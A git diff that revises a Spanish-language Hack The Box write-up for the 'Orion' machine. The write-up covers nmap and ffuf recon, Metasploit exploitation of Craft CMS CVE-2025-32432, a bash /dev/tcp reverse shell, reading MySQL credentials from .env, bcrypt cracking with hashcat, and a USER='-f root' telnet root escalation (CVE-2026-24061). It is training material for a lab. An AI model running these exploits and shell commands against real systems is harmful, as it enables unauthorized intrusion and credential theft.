@@ -1,25 +1,27 @@
----
+
 # Orion WriteUp - Hack The Box
-**Date**: `2026-08-10`
-**Level**: `Easy`
-**OS**: `Linux`
-**IP**: `10.129.244.146`
-**Tags**: `samba`, `metasploit`
----
+- **ID**: `orion`
+- **Date**: `10/08/2026`
+- **Level**: `Easy`
+- **OS**: `Linux`
+- **IP**: `10.129.244.146`
+- **Tags**: `CraftCMS`, `Nginx`, `Metasploit`, `MySQL`,`SSH`,`Telnet`, `CVE-2025-32432`, `CVE-2026-24061`
 
 ## Executive Summary
-Orion es una máquina Linux fácil. La cuál explota una vulnerabilidad presente en un login web y así empezar a comprometer la máquina con **Metasploit**.
+Orion es una máquina Linux fácil. La cual explota una vulnerabilidad presente en un login web y así empezar a comprometer la máquina con **Metasploit**.
 
 ---
 
 ## Reconocimiento
+La primera fase consiste en identificar la disponibilidad del objetivo, descubrir los puertos expuestos y determinar qué servicios están ejecutándose.
 
 ### Ping 
 Lo primero que haremos es saber si tenemos conexión con la máquina victima y saber a qué sistema operativo nos enfrentamos.
+Ejecutamos:
 ```bash 
 ping -c 1 10.129.244.146
 ```
-El cual nos devuelve lo siguiente:
+Resultado:
 ```bash
 PING 10.129.244.146 (10.129.244.146) 56(84) bytes of data.
 64 bytes from 10.129.244.146: icmp_seq=1 ttl=63 time=114 ms
@@ -28,25 +30,29 @@ PING 10.129.244.146 (10.129.244.146) 56(84) bytes of data.
 1 packets transmitted, 1 received, 0% packet loss, time 0ms
 rtt min/avg/max/mdev = 113.538/113.538/113.538/0.000 ms
 ```
-Como lo devuelve el comando anterior, tenemos conexión y estamos contra una máquina con sistema operativo `Linux`, ya sabemos que es porque el **TTL** nos dice hacía que nos enfrentamos, no siempre es lo mismo, pero cuando es cercano a **64** sabemos que es una máquina `Linux`, en caso contrario si se acerca a **128** es una máquina `Windows`.
+Como lo devuelve el comando anterior, tenemos conexión y estamos contra una máquina con sistema operativo `Linux`, ya sabemos que es porque el **TTL** nos dice a que nos enfrentamos, no siempre es lo mismo, pero cuando es cercano a **64** sabemos que es una máquina `Linux`, en caso contrario si se acerca a **128** es una máquina `Windows`.
 
 ### Nmap
-Ahora vamos a mirar que puertos tiene esta máquina abiertos, para ello usamos el siguiente comando **Nmap** en el cuál le vamos a indicar los siguientes parámetros:
-- `-p-`: Indica que queremos escanear los 65535 puertos de la máquina victima.
-- `--open`: Indicamos que solo queremos que nos devuelva que puertos están abiertos.
-- `-sS`: Indicamos que queremos un escaneo del tipo TCP SYN con el fin de ser rápidos y que nos dé bastante información de ser posible.
-- `--min-rate 5000`: Indicamos que debe enviar 5000 paquetes con cada escaneo.
-- `-vvv`: Indicamos que debe de tener verbose, el cuál sirve para agilizar el proceso, en este caso usamos triple verbose para ser muy rápidos.
-_ `-n`: Indicamos que no queremos que nos aplique resolución DNS.
-- `-Pn`: Indicamos que no debe hacer descubrimiento de host, osea que asuma que el host ya está activo y que lo escanee directamente.
-- `10.129.244.146`: Pasamos la IP de la máquina victima.
-- `-oG`: Indicamos que queremos un archivo del tipo Grepable, para que podamos usar herramientas en el como: `grep`, `awk` y demás con el fin de procesarlo fácilmente.
-- `allPorts`: Indicamos el nombre con el que queremos que se guarde la sálida de **Nmap**.
+Ahora vamos a mirar que puertos tiene esta máquina abiertos, para ello usamos el siguiente comando **Nmap**:
 
 ```bash
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.244.146 -oG allPorts
 ```
-Esto nos devuelve:
+Los parámetros utilizados son los siguientes:
+| Parámetro | Descripción |
+|-----|----|
+| `-p-` | Indica que queremos escanear los 65535 puertos de la máquina víctima. |
+| `--open` | Indicamos que solo queremos que nos devuelva qué puertos están abiertos. |
+| `-sS` | Escaneo de tipo TCP SYN para ser rápidos y obtener suficiente información. |
+| `--min-rate 5000`: Envía 5000 paquetes por segundo. |
+| `-vvv` | Triple verbose para agilizar la salida por pantalla. |
+| `-n` | Desactiva la resolución DNS. |
+| `-Pn` | Omite el descubrimiento de host, asumiendo que está activo. |
+| `10.129.244.146` | IP de la máquina víctima. |
+| `-oG` | Genera un archivo de tipo Grepable para procesamiento posterior. |
+| `allPorts` | Nombre con el que se guarda la salida de Nmap. |
+
+Resultado:
 ```javascript
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.991 ( <https://nmap.org> ) at 2026-08-28 16:46 -0500
@@ -68,21 +74,26 @@ Nmap done: 1 IP address (1 host up) scanned in 13.43 seconds
            Raw packets sent: 65537 (2.884MB) | Rcvd: 65537 (2.621MB)
 ```
 De aquí podemos obtener dos puertos importantes y esenciales para poder conectarnos a la máquina:
-- `22`: Este puerto es el que nos permite conectarnos remotamente mediante **SSH(Secure Shell)**, para acceder más adelante al sistema de la máquina victima.
-- `80`: Este puerto es mayormente usado para el manejo de **HTTP**, quien no conozca, es el puerto donde se montan las webs que no tiene seguridad, al igual que el `8080`.
 
-Ahora usando otra vez **Nmap**, vamos a mirar que contiene esos puertos a parte del servicio que corren.
-Lo hacemos con los siguientes parámetros:
-- `-p22,80`: Aca indicamos que puertos queremos escanear, ya no son todos.
-- `-sCV`: En este hacemos una abreviación de `-sC` con el cuál indicamos que usaremos los `scripts predeterminados` de **Nmap** y el `-sV` indicandole que queremos saber las versiones de los servicios que corren en los puertos elegidos. 
-- `10.129.244.146`: Pasamos la IP de la máquina victima.
-- `-oN`: Le indicamos el tipo de archivo, el cual lo queremos del tipo **Nmap**, osea del tipo normal.
-- `targeted`: Es el nombre del archivo donde queremos que se guarde la salida.
+| Puerto | Función |
+|---|---|
+| `22` | Permite la conexión remota mediante **SSH (Secure Shell)** para acceder al sistema más adelante. |
+| `80` | Puerto empleado para el servicio **HTTP**. |
+
+Ahora, utilizando otra vez Nmap, vamos a inspeccionar los servicios y versiones en dichos puertos:
 ```bash
 sudo nmap -p22,80 -sCV 10.129.244.146 -oN targeted
 ```
+Los parámetros utilizados son los siguientes:
+| Parámetro | Descripción |
+|---|---|
+| `-p22,80` | Puertos a escanear |
+| `-sCV` | Abreviación de `-sC` con el cuál indicamos que usaremos los `scripts predeterminados` de **Nmap** y el `-sV` indicandole que queremos saber las versiones de los servicios que corren en los puertos elegidos. |
+| `10.129.244.146` | IP de la máquina víctima. |
+| `-oN` | Archivo del tipo **Nmap**, osea del tipo normal. |
+| `targeted` | Nombre con el que se guarda la salida de Nmap. |
 
-Nos devuelve lo siguiente:
+Resultado:
 
 ```javascript
 Starting Nmap 7.991 ( <https://nmap.org> ) at 2026-08-28 16:47 -0500
@@ -104,8 +115,10 @@ Nmap done: 1 IP address (1 host up) scanned in 12.19 seconds
 ```
 Con todo, ahora sabemos que el servicio del puerto `22` es `OpenSSH` y con versión `8.9p1`, además de que también encontramos que es una máquina `Ubuntu`, la cuál es muy común en estos desafios.
 Ahora también encontramos que el `80` maneja `Nginx` y con versión `1.18.0`, el cuál maneja el servicio **Web**.
-Finalmente encontramos algo que nos interesa mucho, que es la redirección a `http://orion.htb/`, esto nos sirve porque nos detecto el dominio con el cuál podemos acceder a la página web.
 
+El servicio web realiza una redirección hacia http://orion.htb/.
+
+### Dominio local
 Vamos a agregar esa **Url** a nuestro host, para poder acceder a ella, de lo contrario no podríamos. Ejecutamos lo siguiente:
 ```bash
 echo "10.129.244.146 orion.htb" | sudo tee -a /etc/hosts
@@ -117,12 +130,17 @@ cat /etc/hosts
 10.129.244.146	orion.htb
 ```
 
+---
+
+## Enumeration
+Con el dominio configurado, comenzamos a investigar la aplicación web. El objetivo es identificar tecnologías, rutas accesibles, paneles administrativos y posibles puntos de entrada.
+
 ### Whatweb
 Ahora vamos a ver que servicios contiene la página si necesidad de entrar en el navegador, con ayuda de una herramienta llamada **Whatweb**. La usamos de la siguiente manera:
 ```bash
 whatweb http://orion.htb
 ```
-Nos devuelve:
+Resultado:
 ```javascript
 <http://orion.htb> [200 OK] Country[RESERVED][ZZ], Email[your.email@company.com], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.244.146], Open-Graph-Protocol, PoweredBy[CraftCMS], Script, Title[Orion Telecom], UncommonHeaders[x-robots-tag], X-Powered-By[Craft CMS], nginx[1.18.0]
 ```
@@ -132,22 +150,20 @@ Realmento no son muchas cosas, pero bueno algo es algo.
 Ahora vamos a ver la página en si en el navegador:
 ![Descubrimiento web](/images/machines/orion/img-01.png)
 
-## Enumeration
-
+### Descubrimiento de rutas con ffuf
 Para descubrir rutas y recursos ocultos utilizaremos ffuf.
-
 Ejecutamos:
-
 ```bash
 ffuf -u http://orion.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
 ```
-El parámetro:
+Los parámetros utilizados son los siguientes:
+| Parámetro | Descripción |
+|---|---|
+| `-u` | Define la URL objetivo. |
+| `FUZZ` | Indica el lugar donde ffuf realizará las sustituciones. |
+| `-w` | Especifica el diccionario que utilizaremos. |
 
-- `u`: Define la URL objetivo.
-FUZZ: Indica el lugar donde ffuf realizará las sustituciones.
-- `w`: Especifica el diccionario que utilizaremos.
-
-Después de ejecutar el escaneo obtenemos varios resultados:
+Resultado:
 
 ```javascript
 .htaccess               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 102ms]
@@ -174,57 +190,108 @@ index.php               [Status: 200, Size: 12272, Words: 1076, Lines: 386, Dura
 index                   [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 867ms]
 logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 694ms]
 :: Progress: [4752/4752] :: Job [1/1] :: 63 req/sec :: Duration: [0:01:04] :: Errors: 0 ::
-
 ```
-Entre todos estos resultados hay uno especialmente interesante:
-`admin [Status: 302]`
-Esto coincide con el panel administrativo que suele utilizar **Craft CMS**.
-Por lo tanto, tenemos un nuevo punto de interés: `http://orion.htb/admin`
-Mirando ese panel:
+Los tipos de códigos los puedes consultar en el siguiente enlace "". 
+
+Entre ellos destaca uno importante: `admin [Status: 302]`. Esto coincide con el panel administrativo que suele utilizar **Craft CMS**. Por lo tanto, tenemos un nuevo punto de interés: http://orion.htb/admin
+### Inspección de Panel Administrativo
 ![Panel de autenticación](/images/machines/orion/img-02.png)
-Obtenemos la versión de **Craft CMS**: `5.6.16`.
+Obtenemos la versión de **Craft CMS: 5.6.16**.
 
 ---
 
 ## Exploitation
 
-Después de identificar **Craft CMS** y su panel administrativo, podemos investigar la versión y las vulnerabilidades conocidas que afectan a la instalación utilizada por la máquina.
+Tras identificar **Craft CMS 5.6.16**, investigamos los módulos disponibles en **Metasploit**.
 
-En este punto utilizaremos Metasploit para obtener una sesión sobre el servidor.
+La vulnerabilidad que utilizaremos en esta etapa es **CVE-2025-32432**, asociada a la ejecución remota de código previa a la autenticación en Craft CMS mediante la funcionalidad de transformación de imágenes.
 
-Lo primero es buscar y obtener ese exploit:
+### Metasploit
+Abrimos **Metasploit**:
+```bash
+msfconsole
+```
+Buscamos los módulos relacionados con Craft CMS:
+```bash
+msf > search CraftCMS
+
+Matching Modules
+================
+
+   #  Full Name                                               Disclosure Date  Rank       Check  Name
+   -  ---------                                               ---------------  ----       -----  ----
+   0  exploit/linux/http/craftcms_preauth_rce_cve_2025_32432  2025-04-14       excellent  Yes    Craft CMS Image Transform Preauth RCE (CVE-2025-32432)
+   1    \_ target: PHP In-Memory                              .                .          .      .
+   2    \_ target: Unix/Linux Command Shell                   .                .          .      .
+   3  exploit/linux/http/craftcms_ftp_template                2024-12-19       excellent  Yes    Craft CMS Twig Template Injection RCE via FTP Templates Path
+   4  exploit/linux/http/craftcms_unauth_rce_cve_2023_41892   2023-09-13       excellent  Yes    Craft CMS unauthenticated Remote Code Execution (RCE)
+   5    \_ target: PHP                                        .                .          .      .
+   6    \_ target: Unix Command                               .                .          .      .
+   7    \_ target: Linux Dropper                              .                .          .      .
 
 
+Interact with a module by name or index. For example info 7, use 7 or use exploit/linux/http/craftcms_unauth_rce_cve_2023_41892
+After interacting with a module you can manually set a TARGET with set TARGET 'Linux Dropper'
+```
+Seleccionamos el módulo correspondiente a **CVE-2025-32432**:
+```bash
+msf > use 0 
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+```
+
+### Configurando las opciones
 Miramos las opciones:
-
+```bash
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > options
+```
 ![Metasploit](/images/machines/orion/img-03.png)
 
 Configuramos el objetivo:
 ```bash
-RHOSTS: orion.htb
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set RHOSTS orion.htb
+RHOSTS => orion.htb
 ```
 Y nuestra dirección:
 ```bash
-LHOST: <nuestra IP>
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set LHOST <TU_IP>
+LHOST => <TU_IP>
 ```
 Para mirar nuestra IP usamos:
 ```bash
-ifconfig
+ip addr
 ```
-Y ahí encontraremos algo como: `10.10.14.12`.
+Y ahí encontraremos en el `tun0` algo como: `10.10.x.x`.
 
+### Configurando Payload
 Antes de ejecutar el exploit configuramos el payload:
 ```bash
-set payload php/meterpreter/reverse_http
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set payload php/meterpreter/reverse_http
+payload => php/meterpreter/reverse_http
 ```
 Y revizamos que todo esté bien:
 ![Metasploit Options](/images/machines/orion/img-04.png)
 
+### Ejecución del módulo
 Ahora ejecutamos el módulo y conseguimos una sesión Meterpreter sobre el servidor:
+```bash
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > run
+```
+Resultado:
+```bash
+[*] Started HTTP reverse handler on http://<TU_IP>:8080/
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] Leaked session.save_path: /var/lib/php/sessions
+[+] The target is vulnerable. Session path leaked
+[*] Injecting stub & triggering payload...
+[*] http://<TU_IP>:8080/ handling request from 10.129.244.146; (UUID: 32tehqry) Staging php payload (72926 bytes) ...
+[*] Meterpreter session 16 opened (<TU_IP>:8080 -> 10.129.244.146:45656) at 2026-10-12 07:51:13 -0500
+
+meterpreter > 
+```
 ![Meterpreter Session](/images/machines/orion/img-05.png)
 
 
-### Enumeración desde Meterpreter
+## Enumeración del sistema desde Meterpreter
 
 Ahora que tenemos acceso al sistema, podemos comenzar a buscar información que nos permita avanzar.
 
@@ -234,7 +301,7 @@ meterpreter > cd ..
 meterpreter > ls
 ```
 
-Obtenemos:
+Resultado:
 ```javascript
 Listing: /
 ==========
@@ -265,6 +332,10 @@ Mode              Size   Type  Last modified              Name
 
 ```
 Encontramos el directorio `home` en el cuál podemos encontrar usuarios:
+```bash
+meterpreter > cd /home
+meterpreter > ls
+```
 
 ![User found](/images/machines/orion/img-06.png)
 
@@ -276,8 +347,7 @@ Sabemos que el servidor utiliza **Nginx**, por lo que revisaremos: `/var/www`.
 Nos dirigimos allí:
 
 ```bash
-meterpreter > cd var
-meterpreter > cd www
+meterpreter > cd /var/www
 meterpreter > ls
 ```
 Encontramos:
@@ -305,14 +375,14 @@ Mode              Size  Type  Last modified              Name
 100644/rw-r--r--   612  fil   2026-03-06 04:56:27 -0500  index.nginx-debian.html
 ```
 Tenemos un directorio llamado: `craft`.
-Esto coincide con la tecnología que encontramos anteriormente mediante WhatWeb. **Craft CMS**.
+Esto coincide con la tecnología que encontramos anteriormente mediante **WhatWeb**. **Craft CMS**.
 
 Entramos al directorio:
 ```bash
 meterpreter > cd craft
 meterpreter > ls
 ```
-Encontramos:
+Resultado:
 ```javascript
 Listing: /var/www/html/craft
 ============================
@@ -342,7 +412,7 @@ Por lo tanto, vamos a revisar su contenido:
 ```bash
 meterpreter > cat .env
 ```
-Obtenemos:
+Resultado:
 ```javascript
 # Read about configuration, here:
 # https://craftcms.com/docs/5.x/configure.html
@@ -375,26 +445,24 @@ Aquí encontramos las credenciales de la base de datos:
 
 Con esto podemos intentar acceder directamente a **MySQL**.
 
-### Obtención de acceso a MySQL
+## Acceso a MySQL y enumeración de la base de datos
 
-| Por alguna razón, Meterpreter no permite crear una shell de manera convencional en esta máquina.
-
-Por lo tanto, vamos a utilizar nuestra propia terminal para recibir una conexión.
-
+### Obtener una terminal del sistema
+Por alguna razón, Meterpreter no permite crear una shell de manera convencional en esta máquina. Por lo tanto, vamos a utilizar nuestra propia terminal para recibir una conexión.
 Primero nos ponemos en escucha:
 ```bash
 nc -lvnp 9001
 ```
 Desde Meterpreter ejecutamos:
 ```bash
-meterpreter > execute -f /bin/bash -a "-c 'bash -i >& /dev/tcp/10.10.14.182/9001 0>&1'"
+meterpreter > execute -f /bin/bash -a "-c 'bash -i >& /dev/tcp/<TU_IP>/9001 0>&1'"
 ```
 De esta manera obtenemos una shell desde nuestra terminal.
 ![Listening](/images/machines/orion/img-07.png)
 
 Ahora podemos trabajar directamente con la terminal del sistema.
 
-### Enumeración de MySQL
+### Conexión a MySQL
 
 Utilizamos las credenciales encontradas anteriormente para conectarnos a la base de datos:
 ```bash
@@ -402,7 +470,8 @@ mysql -u root -p orion
 ```
 Introducimos la contraseña: `SuperSecureCraft123Pass!`
 
-Una vez dentro podemos enumerar las tablas:
+### Enumeración de tablas
+Ejecutamos:
 ```sql
 show tables;
 ```
@@ -476,8 +545,7 @@ volumes
 webauthn
 widgets
 ```
-
-La tabla que nos interesa especialmente es: `users`.
+La tabla `users` resulta especialmente relevante porque puede almacenar información de las cuentas registradas en Craft CMS.
 
 Por lo tanto ejecutamos:
 ```sql
@@ -490,38 +558,28 @@ admin           1
 email           adam@orion.htb
 password        $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
 ```
-
-Tenemos un hash de contraseña correspondiente al usuario: `adam`.
-
-El formato: `$2y$13$`.
-
+Tenemos un hash de contraseña correspondiente al usuario `adam` con el formato `$2y$13$` que
 corresponde a bcrypt, por lo que podemos intentar realizar un ataque de diccionario offline utilizando **Hashcat**.
 
-### Cracking del hash
-
-Guardamos el hash:
-
-`$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS`
-
-en un archivo llamado:
-
-`password.txt`
+## Recuperación de la contraseña con Hashcat
+Guardamos el hash `$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS` en un archivo llamado: `password.txt`.
 
 Después utilizamos **Hashcat** con el modo correspondiente a **bcrypt**:
 ```bash
 hashcat -m 3200 password.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
 ```
-El diccionario utilizado es:
+Los parámetros utilizados son los siguientes:
+| Parámetro | Descripción |
+|---|---|
+| `-m 3200` | Selecciona el modo de hash bcrypt. |
+| `password.txt` | Contiene el hash que queremos comprobar. |
+| `rockyou.txt` | El diccionario de contraseñas que se utilizará para realizar los intentos. |
 
-`rockyou.txt`
-
-Después del proceso conseguimos recuperar la contraseña: `darkangel`.
-
-Por lo tanto tenemos: `Username: adam, Password: darkangel`
+Después del proceso conseguimos recuperar la contraseña: `darkangel`. Por lo tanto tenemos: `Username: adam, Password: darkangel`
 
 Ahora podemos intentar utilizar estas credenciales para conectarnos mediante **SSH**.
 
-### Acceso SSH
+## Acceso SSH y obtención de la user flag
 
 Ejecutamos:
 ```bash
@@ -559,17 +617,15 @@ Y obtenemos la flag:
 ```bash
 cat user.txt
 ```
-Resultado: `db867de337da6ae745373a0ac8602269`
+Resultado: `3c9325a3ec4be2d7af987ef7099f21fe`
 
 Con esto hemos conseguido la **user flag**.
 
 ## Escalada de privilegios
+El objetivo de esta fase es identificar un servicio, una configuración o una vulnerabilidad que permita pasar de la cuenta adam a una sesión con privilegios de `root`.
 
-Ahora necesitamos conseguir acceso como **root**.
-
-Lo primero será enumerar los servicios que están escuchando en la máquina.
-
-Para ello utilizamos:
+### Enumeración de servicios locales
+Comenzamos examinando los puertos en estado de escucha:
 ```bash
 ss -lntup
 ```
@@ -585,21 +641,14 @@ tcp     LISTEN  0        511      0.0.0.0:80                 0.0.0.0:*
 tcp     LISTEN  0        80       127.0.0.1:3306              0.0.0.0:*
 tcp     LISTEN  0        128      [::]:22                     [::]:*
 ```
-Aquí aparece algo que no habíamos visto durante nuestro escaneo inicial: `127.0.0.1:23`
-
-El puerto `23` corresponde normalmente a **Telnet**.
-
-Además, solamente está escuchando en: `127.0.0.1`
-
-Por eso no apareció durante nuestro escaneo externo inicial.
+Aquí aparece algo que no habíamos visto durante nuestro escaneo inicial: `127.0.0.1:23`. El puerto `23` corresponde normalmente a **Telnet**. Además, solamente está escuchando en: `127.0.0.1`. Por eso no apareció durante nuestro escaneo externo inicial.
 
 ### Enumeración de Telnet
-
 Vamos a comprobar la versión instalada:
 ```bash
 telnet --version
 ```
-Obtenemos:
+Resultado:
 ```javascript
 telnet (GNU inetutils) 2.7
 Copyright (C) 2025 Free Software Foundation, Inc.
@@ -607,12 +656,8 @@ License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
 ```
 La versión es: `GNU inetutils 2.7`.
 
-Durante la investigación encontramos una vulnerabilidad asociada a esta versión.
-
-La documentación utilizada para este punto es:
-`OffSec - CVE-2026-24061`
-
-La vulnerabilidad permite manipular el argumento utilizado por el cliente **Telnet** mediante la variable de entorno **USER**.
+Durante la investigación encontramos una vulnerabilidad asociada a esta versión. La documentación utilizada para este punto es:
+`OffSec - CVE-2026-24061` la cuál tiene vulnerabilidad permite manipular el argumento utilizado por el cliente **Telnet** mediante la variable de entorno **USER**.
 
 En el contexto de esta máquina podemos probar:
 ```bash
@@ -624,7 +669,15 @@ Ejecutamos:
 ```bash
 USER='-f root' telnet -a 127.0.0.1
 ```
-El servicio responde:
+Aquí se utilizan los siguientes:
+| Parámetro | Descripción |
+|---|---|
+| `USER='-f root'` | Establece temporalmente la variable de entorno USER para el proceso que se ejecuta. |
+| `telnet` | Inicia el cliente Telnet. |
+| `-a` | Activa el comportamiento de autenticación automática del cliente. |
+| `127.0.0.1` | Apunta al servicio que escucha localmente en la propia máquina. |
+
+Resultado:
 ```bash
 Trying 127.0.0.1...
 Connected to 127.0.0.1.
@@ -655,24 +708,32 @@ root@orion:~#
 Y lo más importante: `root@orion:~#`
 Ahora tenemos una sesión como **root**.
 
-### Root Flag
+### Obtención de root flag
 
 Finalmente comprobamos el contenido del directorio de **root**:
 ```bash
 cat root.txt
 ```
-Obtenemos: `03778b8dfdd9503f34d41c4fcdfaa736`
+Obtenemos: `0992d3d2845d5c4b00cc4a6c090d9000`
 
 Con esto hemos conseguido la **root flag** y completamos la máquina.
 
-# Conclusión
+## Conclusión
 
-La máquina Orion demuestra una cadena de ataque en varias etapas.
+La máquina Orion demuestra cómo varias debilidades pueden encadenarse para comprometer un sistema `Linux`.
 
-Inicialmente, el reconocimiento permitió identificar los servicios **SSH** y **HTTP**. La enumeración del servidor web reveló el uso de **Craft CMS**, y posteriormente la enumeración de contenido permitió localizar el panel administrativo.
+La primera fase consistió en identificar los puertos abiertos y descubrir que el servidor web utilizaba **Nginx** y **Craft CMS**. La enumeración posterior reveló el panel administrativo y permitió investigar una vulnerabilidad de ejecución remota de código previa a la autenticación.
 
-Después de comprometer la aplicación conseguimos acceso mediante Meterpreter, desde donde pudimos revisar los archivos de configuración de **Craft CMS**. El archivo .env contenía las credenciales de la base de datos **MySQL**.
+Tras conseguir acceso mediante Meterpreter, revisamos los archivos de la aplicación y encontramos credenciales de **MySQL** en .env. La consulta de la tabla users permitió obtener el hash del usuario administrador `adam`, cuya contraseña recuperamos mediante un ataque de diccionario con **Hashcat**.
 
-Con acceso a **MySQL** encontramos el hash de contraseña del usuario administrador adam. Utilizando **Hashcat** y el diccionario `rockyou.txt` conseguimos recuperar la contraseña y utilizarla para acceder mediante **SSH**.
+Con esas credenciales accedimos por **SSH** y obtuvimos la user `flag`. Finalmente, la enumeración de los servicios locales reveló un servicio Telnet que escuchaba exclusivamente en `127.0.0.1`. La investigación de **CVE-2026-24061** y la prueba realizada sobre ese servicio permitieron obtener una sesión como `root` y recuperar la `root flag`.
 
-Finalmente, una enumeración de servicios locales reveló un servicio Telnet que no era visible desde el exterior porque únicamente escuchaba en `127.0.0.1`. La versión instalada era vulnerable a **CVE-2026-24061**, lo que permitió conseguir acceso como **root**.
+El aprendizaje principal de Orion es que un acceso inicial limitado puede convertirse en un compromiso completo cuando se combinan vulnerabilidades de software, exposición de credenciales y servicios locales mal configurados.
+
+Por ello, el reconocimiento, la enumeración y la validación de cada hallazgo son tan importantes como la explotación misma.
+
+## Flags
+### User flag
+`3c9325a3ec4be2d7af987ef7099f21fe`
+### Root flag
+`0992d3d2845d5c4b00cc4a6c090d9000`
